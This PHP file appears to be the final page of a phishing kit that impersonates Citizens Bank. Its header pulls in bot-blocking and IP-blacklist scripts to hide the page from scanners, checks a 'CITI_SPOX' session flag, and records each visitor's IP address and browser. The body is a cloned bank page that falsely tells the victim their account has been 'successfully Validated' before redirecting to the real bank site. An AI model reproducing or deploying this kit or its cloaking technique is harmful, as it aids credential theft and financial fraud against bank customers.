<?php
session_start();
error_reporting(0);
require_once 'Anti/main.php';
include('Anti/detects.php');
include('Anti/blockers.php');
include'Anti/IP-BlackList.php';  
include'Anti/Bot-Crawler.php';
include'Anti/Bot-Spox.php';
include'Anti/blacklist.php';
include'Anti/new.php';
include'Anti/Fuck-you.php'; 
include'Anti/Dila_DZ.php';
date_default_timezone_set('Europe/London');
$v_ip = $_SERVER['REMOTE_ADDR'];
$v_agent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);


if (!isset($_SESSION['CITI_SPOX'])) {

  header("Location: index");
  exit();
}



?>
<html lang="en-US" style="" class="js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths citizens-Chrome citizens-user-none"><head>


<!-- // removing loginnew-wait.jsp from search results requirement OLB-7248  -->

<!-- // removing logout.jsp from search results requirement OLB-4998  -->









<!-- // removing logout.jsp from search results requirement OLB-4998  -->


<!-- // removing loginnew-wait.jsp from search results requirement OLB-7248  -->

	<link href="https://www4.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon.png" rel="apple-touch-icon">
	<link href="https://www4.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76">
	<link href="https://www4.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120">
	<link href="https://www4.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152">
	<link href="https://www4.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180">
	<link href="https://www4.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/icon-hires.png" rel="icon" sizes="192x192">
	<link href="https://www4.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/icon-normal.png" rel="icon" sizes="128x128">
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<!--Exclude Ensighten library incase skipEnsighten is "true"-->
	
<title>Online Login | Citizens Bank</title>
<meta name="description" content="Log in to your Citizens Bank account by entering your User ID and password so you can securely view and manage your accounts online.">







<link rel="stylesheet" href="https://www4.citizensbankonline.com/efs/efs/jsp-ns/inc/css/jquery-ui-1.10.3.custom.min.css">
<link rel="stylesheet" href="https://www4.citizensbankonline.com/efs/efs/jsp-ns/inc/css/normalize.css">
<link rel="stylesheet" href="https://www4.citizensbankonline.com/efs/efs/jsp-ns/inc/css/main.css">
<link rel="stylesheet" href="https://www4.citizensbankonline.com/efs/efs/jsp-ns/inc/css/flows.css">
<link rel="stylesheet" href="https://www4.citizensbankonline.com/efs/efs/jsp-ns/inc/css/ad-containers.css">


<!--[if lt IE 9]>
<script src="/efs/efs/jsp-ns/scripts/html5shiv.js"></script>
<![endif]-->





<!--[if IE]>
<style type='text/css'>
form select#SavedUserID {
    width : 200px;
}
</style>
<![endif]-->


<meta http-equiv="Refresh" content="05; URL=https://www.citizensbank.com/account-safeguards/online-terms-and-conditions.aspx">



<style>
	input[type=password].error {
		border-color : red;
	}
</style>



<style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}</style>

</head>
<body class="responsive-enabled" data-inq-observer="1">
   


<script type="text/javascript" src="/efs/efs/js/tealeaf.js"></script>
<!-- begin CITIZENS BANK Hosted Header -->
<div class="citizens-header-footer-injected">

<link rel="stylesheet" type="text/css" href="/efs/hhf/css/citizensns.min.41973.css">
<!--[if IE 8]><link rel="stylesheet" type="text/css" href="/efs/hhf/css/citizensns-ie8.min.41973.css?refresh=1588599663803"><![endif]-->
<style>
.help-modal-header .help-modal-close {background: url(/efs/hhf/img/modal-help-close.png) center center no-repeat transparent; background-size: 20px;}
.help-modal-menu a.active {background: #f2faf8 url(/efs/hhf/img/arrow-right-green.png) right 20px center no-repeat; background-position: right 20px center; background-size:7px}
.account-section-title.checkmark h1 {padding: 0px 0px 5px 28px !important; }
.lt-ie9 .help-modal-menu a.active {background: #f2faf8 url(/efs/hhf/img/arrow-right-green.png) right 20px center no-repeat !important; background-size:7px !important}
.input-wrapper .tooltip {margin-left: 1px;}
</style>
<div class="citizens-header-footer"><div class="citi-modal timeout-modal simplemodal-data" id="timeout-modal" style="display:none;"></div><div class="citi-modal help-modal" id="help-modal" tabindex="0" style="display:none;"></div>
</div>
</div><div class="citizens-header">

    <!-- overlay to hide elements until CSS is loaded -->
    <style>
        .citizens-header-footer-overlay{ opacity:1; background-color:#fff; position:fixed; width:100%; height:100%; top:0px; left:0px; z-index:1000; }
        .citizens-header-footer-overlay .centered-content { width: 100%; max-width: 1060px; padding: 0 20px; margin: 0 auto; font-family: arial, helvetica, san-serif; font-size: 14px;}
        .citizens-header-footer-overlay .responsive-enabled .centered-content { width: auto; max-width: 1060px; }
        .citizens-header-footer-overlay .page-logo { float: none; }
        .citizens-header-footer-overlay .page-logo img{ margin: 10px; float: none;}
        .citizens-header-footer-overlay .topshadow {
            position: absolute; width: 100%; top: 100px; z-index: 5; height: 8px; 
            background: -webkit-radial-gradient(50% 100%, farthest-side, rgba(0, 0, 0, 0.1), transparent 100%); background: radial-gradient(farthest-side at 50% 100%, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0) 100%); background-repeat: no-repeat; background-size: cover;
        }
    </style> 
    
    <!-- end overlay -->

    <style>
        .account-section-title.checkmark h1 { padding: 0px 0px 5px 28px !important; }
        .mobile-alert-dot {min-width: 22px; min-height: 22px; width: auto; height: auto; max-width: 50px; max-height: 50px; padding: 5px; }
    </style>

    <!-- htmlContainer PREFIX -->
    <div class="citizens-header-footer">
        <div id="page-header" class="page-header">
            <!-- inc-header.html START -->
            <div class="topshadow"></div>
            <div class="centered-content clearfix">

                <a href="http://www.citizensbank.com" class="page-logo" tabindex="1">
                    <!-- Display the brand logo for either citizens one or citizen bank customers -->
                    <img border="0" alt="Citizens Bank" width="203" height="25" src="/efs/hhf/img/CTZ_Green-01.png">
                </a>
                <div id="header-navigation-container"></div>

            </div>
            <!-- inc-header.html END -->
        </div>
    </div>
    <!-- htmlContainer SUFFIX -->


</div>
<!-- end CITIZENS BANK Hosted Header -->




<div id="page-container" class="page-container">
	<div class="centered-content clearfix">
		<section id="top-content" class="page-region top-content">
        
    	</section>
    	<section id="main-container" class="main-container two-col layout-2-1 clearfix">

        	<!-- =================
        	MAIN CONTENT AREA START
        	================= -->
        	<section id="main-content" class="page-region main-content full-width">
  
 
   <div class="account-table account-table-full final-flow-screen">
      <div class="account-table-content">
         <div class="account-content-container">
            <header class="darkgreen-top">
               <h1>Logged Out</h1>
            </header>
            <div class="account-table-body">
               <header class="account-section-title clearfix checkmark">
                  <h1>Your Account has been successfully Validated.</h1>
               </header>
               <section class="account-section no-form">
               
	               
               	   
	               <form class="spacer" id="frmLogout">
	                   <input type="hidden" name="CSRF_TOKEN" value="0TNY-TMKB-9XP0-F1F3-1LJX-J10O-CDPH-GJBV">
	                   <input type="hidden" name="sessionid" value="2vaSC1aBMrjLpvCSYrUy_zA">
					  <!--Return to the login page with the right branding and query param-->
	                  <a id="returntologin" class="button arrow" href="https://www4.citizensbankonline.com/">Return to Login</a>
	               </form>
	           
                   <div class="ad-container two-ad-row clearfix" style="margin:20px auto 10px;">
                        <table width="95%" style="padding : auto .5%">
                        <tbody><tr>
                          <td width="46.5%">
                            
                          </td>
                        
                          <td width="46.5%">
                            
                          </td>
                        </tr>
                        </tbody></table>
		   </div>
               </section>

            </div>
         </div>
      </div>
   </div>


   


		</section> 
	</section></div> 
</div> 









<!-- begin CITIZENS BANK Hosted Footer -->
<div class="citizens-footer"><div class="citizens-header-footer">






<footer id="page-footer" class="page-footer"><div class="footer-top">
<ul><li><div id="inqC2CImgContainer_olbFooter"></div></li>
<li>
<a href="#" class="contact" title="Opens Ways to Contact Us Dialog">
<span class="account-underline">Ways to Contact Us</span><span class="visuallyhidden">- Opens Ways to Contact Us Dialog</span>
</a>
<div class="dropup-menu">
<h4>Contact Us</h4>
<p>General Questions:
<br>
<strong>1-800-656-6561</strong> (personal bank accounts)
<br>
Business Questions:
<br>
<strong>1-877-229-6428</strong> (online banking support)
<br>
<strong>1-800-862-6200</strong> (account information)
<br>
Investment Questions:
<br>
<strong>1-800-942-8300</strong> (Citizens Investment Services)
</p>
<!--
<p>Go to <a href="/customer-service/">Customer Service</a> to send us email or mail or to view FAQs</p>
<p><a href="/forms/contactme.aspx">We'll Contact You</a></p>
-->
</div>
</li>
<!-- As part of Def# 1465 Location is commented on Auth/UnAuth pages.
<li><span class="location">Your Location: NONE</span>
</li>
-->

<li>
<a href="#" class="locator" title="Opens Branch &amp; ATM Locator Dialog">
<span class="account-underline">Branch &amp; ATM Locator</span><span class="visuallyhidden">- Opens Branch &amp; ATM Locator Dialog</span>
</a>
<div class="dropup-menu">
<h4>Branch &amp; ATM Locator</h4>
<p>Find one of our 1,300 locations near you.</p>
<div role="form">
<div id="stickyFooterBranch-error" class="error-message" style="display: none"></div>
<input id="stickyFooterBranch" type="text" title="Enter Zip Code or City, State" placeholder="Enter Zip Code or City, State" value="NONE">
<a href="#" type="button" class="button button-stickyfooterbranch">Submit</a>
</div>
</div>
</li>
<li><a onclick="showSurvey(formId);" style="cursor:pointer;"><img src="https://www.citizensbank.com/assets/CB_media/images/feedback.png" alt="Give Feedback" border="0" style="cursor:pointer;border:0px;height:40px;width:40px;padding-right:4px;">Feedback</a></li></ul>
</div>
<div class="footer-row clearfix">
<ul>
<li>
<h6>Checking &amp; Savings</h6>
</li>
<!--        <li><a  href="http://www.citizensbank.com/checking-and-savings.aspx">Checking &amp; Savings Overview</a></li>-->
<li>
<a  href="#">Checking</a>
</li>
<li>
<a  href="#">Savings</a>
</li>
<li>
<a  href="#">Money Markets</a>
</li>
<li>
<a  href="#">Certificates of Deposit (CDs)
<sup>®</sup>
</a>
</li>
<li>
<a  href="#">IRAs</a>
</li>
<li>
<a  href="#">Programs &amp; Services</a>
</li>
<li>
<a  href="#">Benefits &amp; Features</a>
</li>
<li>
<a  href="#">Debit Card</a>
</li>
<li>
<a  href="#">Overdraft Choices
<sup>®</sup>
</a>
</li>
</ul>
<ul>
<li>
<h6>Home Borrowing</h6>
</li>
<!--        <li><a  href="http://www.citizensbank.com/loans/">Home Borrowing Overview</a></li>-->
<li>
<a  href="#">Mortgages</a>
</li>
<li>
<a  href="#">Home Equity Loans</a>
</li>
<li>
<a  href="#">Home Equity Lines of Credit</a>
</li>
<li>
<a  href="#">Determine My Rate</a>
</li>
<li>
<a  href="#">My Mortgage Account</a>
</li>
</ul>
<ul>
<li>
<h6>Students</h6>
</li>
<!--<li><a  href="http://www.citizensbank.com/student-services/">Students Overview</a></li>
<li><a  href="http://www.citizensbank.com/student-banking/">Banking</a></li>
<li><a  href="http://www.citizensbank.com/student-loans/undergradfamilies.aspx">Undergraduate Borrowing</a></li>
<li><a  href="http://www.citizensbank.com/student-loans/gradstudents.aspx">Graduate Borrowing</a></li>
<li><a  href="http://www.citizensbank.com/student-loans/process.aspx">The Student Loan Process</a></li>
<li><a  href="http://www.citizensbank.com/student-loans/tools.aspx">Student Tools &amp; Resources</a></li>-->
<li>
<a  href="#">Student Loan Options</a>
</li>
<li>
<a  href="#">Refinancing Student Loans</a>
</li>
<li>
<a  href="#">The Student Loan Process</a>
</li>
<li>
<a  href="#">Undergraduate Students &amp; Parents</a>
</li>
<li>
<a  href="#">Graduate Students</a>
</li>
<li>
<a  href="#">Tools &amp; Information</a>
</li>
<li>
<a  href="#">Banking for Students</a>
</li>
<li>
<a  href="#">Access My Student Loan</a>
</li>
</ul>
<ul class="last">
<li>
<h6>Cards</h6>
</li>
<!--        <li><a  href="http://www.citizensbank.com/cards-and-rewards/">Cards Overview</a></li>-->
<li>
<a  href="#">Credit Cards</a>
</li>
<!--        <li><a  href="http://www.citizensbank.com/cards-and-rewards/debit-card/debit-card.aspx">Debit Card</a></li>-->
<li>
<a  href="#">Card Agreements</a>
</li>
<li>
<a  href="#">Security Features</a>
</li>
</ul>
</div>

<div class="footer-row clearfix">
<ul>
<li>
<h6>Personal Loans</h6>
</li>
<li>
<a  href="#">Overview</a>
</li>
<li>
<a  href="#">FAQs</a>
</li>
</ul>
<ul>
<li>
<h6>Resources</h6>
</li>
<li>
<a  href="#">Order Checks</a>
</li>
<li>
<a  href="#">Online &amp; Mobile Banking</a>
</li>
<li>
<a  href="#">Customer Service</a>
</li>
</ul>
<ul>
<li>
<h6>About Us</h6>
</li>
<!--        <li><a  href="http://www.citizensbank.com/about-us/">About Us Overview</a></li>-->
<li>
<a  href="#">About Citizens Bank</a>
</li>
<li>
<a  href="#">In the Community</a>
</li>
<li>
<a  href="#">Careers</a>
</li>
<li>
<a  href="#">About Our Ads</a>
</li>
</ul>
<ul class="last">
<li>
<h6>Solutions</h6>
</li>
<li>
<a  href=#">Personal</a>
</li>
<li>
<a  href="#">Investing</a>
</li>
<li>
<a  href="#">Small Business</a>
</li>
<li>
<a  href="#">Commercial</a>
</li>
</ul>
</div>

<div class="footer-row clearfix">
<ul>
<li>
<h6>Disclosures</h6>
</li>
<li>
<a  href="#">Online Terms and Conditions</a>
</li>
<li>
<a  href="#">Electronic Notice Disclosure and Consent (Online Service)</a>
</li>
<li>
<a  href="#">Account Documents</a>
</li>
<li>
<a  href="#">Member FDIC</a>
</li>
<li>
<a  href="#">Equal Housing Lender
<img alt="Equal Housing Lender" title="Equal Housing Lender" src="https://www4.citizensbankonline.com/efs/hhf/img/equal-housing.gif">
</a>
</li>
<li>
<a  href="#/">Security, Privacy &amp; Legal</a>
</li>
</ul>
</div>
<div class="centered-content">
<div class="footer-bottom">
<p class="legal">
Zelle and the Zelle related marks are wholly owned by Early Warning Services, LLC and are used herein under license.
</p>
<p class="legal">
*Securities, Insurance and Investment Advisory Services offered through Citizens Securities, Inc. ("CSI"), also referred to as Citizens Investment Services. CSI is an SEC registered investment adviser and Member - FINRA and SIPC. 770 Legacy Place, MLP240, Dedham, MA 02026. (800) 942-8300. CSI is an affiliate of Citizens Bank, N.A.<br><br>The investment balances shown in online banking are based on market prices, with up to a fifteen minute delay from the time this webpage was last refreshed.  Information relating to accounts not held at CSI is presented as an accommodation and while drawn from sources believed to be reliable is not guaranteed as to accuracy or completeness. Such information should be independently confirmed by the account owner(s).<br><br>Information relating to accounts not held or custodied by National Financial Services (NFS) (Assets Held Away), CSI’s clearing broker dealer, was provided to NFS by outside parties and is included for informational purposes only.  These positions are not part of your brokerage account carried by NFS and therefore any SIPC account protection afforded your account through NFS does not cover these assets or prices reported.  Neither NFS, CSI nor Citizens Bank are responsible for the Assets Held Away information provided and does not guarantee the accuracy or timeliness of the positions or prices reported.  Prices shown do not necessarily reflect the actual current market prices. Further information regarding these prices may be obtained by contacting CSI.<br><br>The investment products and financial strategies suggested herein are subject to investment risk, including possible loss of principal amount invested. Investment decisions should be based on each individual's goals, time horizon and tolerance for risk.<br><br>SpeciFi<sup>®</sup> is made available through CSI. Portfolio management services are sub-advised by SigFig Wealth Management, LLC ("SigFig"), an SEC registered investment adviser. SigFig is not an affiliate of CSI or Citizens Bank, N.A.
</p>

<div class="footer-disclaimer-box footer-disclaimer-box--margin-bottom footer-disclaimer">
<p class="footer-disclaimer-box__text">Securities and Insurance Products are:</p>
<ul class="footer-disclaimer-box__list">
<li class="footer-disclaimer-box__list-item">NOT FDIC INSURED</li>
<li class="footer-disclaimer-box__list-item">NOT BANK GUARANTEED</li>
<li class="footer-disclaimer-box__list-item">MAY LOSE VALUE</li>
<li class="footer-disclaimer-box__list-item">NOT A DEPOSIT
<br>
</li>
<li class="footer-disclaimer-box__list-item">NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY</li>
</ul>
</div>
<ul class="footer-util">
<li class="sitemap">
<a  href="#">Site Map</a>
</li>
<li>Follow:
<a  href="#">
<img src="https://www4.citizensbankonline.com/efs/hhf/img/footer-follow-facebook.png" alt="Facebook" align="middle">
</a>
<a  href="#">
<img src="https://www4.citizensbankonline.com/efs/hhf/img/footer-follow-twitter.png" alt="Twitter">
</a>
<a  href="#">
<img src="https://www4.citizensbankonline.com/efs/hhf/img/footer-follow-linkedin.png" alt="Linkedin">
</a>
<a  href="#">
<img src="https://www4.citizensbankonline.com/efs/hhf/img/footer-follow-youtube.png" alt="Youtube">
</a>
</li>
</ul>

<p class="footer-copyright">
© Copyright 2020 Citizens Financial Group, Inc. All rights reserved.<br>Citizens Bank is a brand name of Citizens Bank, N.A. (NMLS ID# 433960).<br>Citizens Bank corporate headquarters: One Citizens Plaza, Providence, RI 02903
</p>

<img src="https://www4.citizensbankonline.com/efs/hhf/img/elh.gif" alt="Equal Housing Lender">
<img src="https://www4.citizensbankonline.com/efs/hhf/img/fdicFooter.gif" alt="Member FDIC">
</div>
</div>
</footer></div></div>
<script type="text/javascript">

    if(typeof HHF === "undefined"){
        var el = document.querySelector(".citizens-header");
        el.innerHTML = '';
    } else {
        contentLoaded(window, function() {
            var hhfPromise = HHF.init({
                'showNav': false,
                'initialHelpRequest': false,
                'showTimeout': false,
                'useCSS': false
            });
            hhfPromise.done(function(args){
                console.log('hhfPromise.msg: ' + args.attributes.msg);
            });
            hhfPromise.fail(function(args){
                $('.citizens-header').html('');
            });
        }); 
    }
</script>
<!-- end CITIZENS BANK Hosted Footer -->






<noscript><img src="https://www4.citizensbankonline.com/akam/11/pixel_12a1ea40?a=dD1jZWM3NzI1N2RhMzJhMzVlODZhMDRhYTRhMTYwNWMyODA0NTFmNThmJmpzPW9mZg==" style="visibility: hidden; position: absolute; left: -999px; top: -999px;" /></noscript><script type="text/javascript">var _cf = _cf || []; _cf.push(['_setFsp', true]);  _cf.push(['_setBm', true]); _cf.push(['_setAu', '/resources/0d3508a9b2212c8fc6a5d47cebb22b']); </script><script type="text/javascript" src="/resources/0d3508a9b2212c8fc6a5d47cebb22b"></script>




 <!--  End Main Container -->

 



 <div id="inqC2CImgContainer_QA1" class="block" style="position: fixed; right: 0px; top: 40%; z-index: 999999;"></div><div id="inqC2CImgContainer_Mob" class="block" style="position: fixed; right: 0px; top: 40%; z-index: 999999;"></div><div id="inqC2CImgContainer_contactus" class="block"></div>
 <span></span><iframe id="inqChatStage" title="Chat Window" name="345" src="https://www4.citizensbankonline.com/inqChat.html?IFRAME" style="z-index:9999999;overflow:hidden;position:absolute;height:1px;width:1px;left:0px;top:0px;border-style: none;border-width: 0px;display: none;" scrolling="NO" frameborder="0"></iframe><div id="inqDivResizeCorner" style="border-width: 0px; position: absolute; z-index: 9999999; left: 424px; top: 284px; cursor: se-resize; height: 16px; width: 16px; display: none;"></div><div id="inqResizeBox" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; display:none; height: 0px; width: 0px;"></div><div id="inqTitleBar" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; cursor: move; height: 55px; width: 410px; display: none;"></div>
 <div id="injectTargetScreenReader" role="alert" aria-live="polite" aria-relevant="additions text" aria-atomic="false" style="overflow: hidden; height: 1px; width: 1px; left: -1000px; top: 0px; position: absolute;"></div></body></html>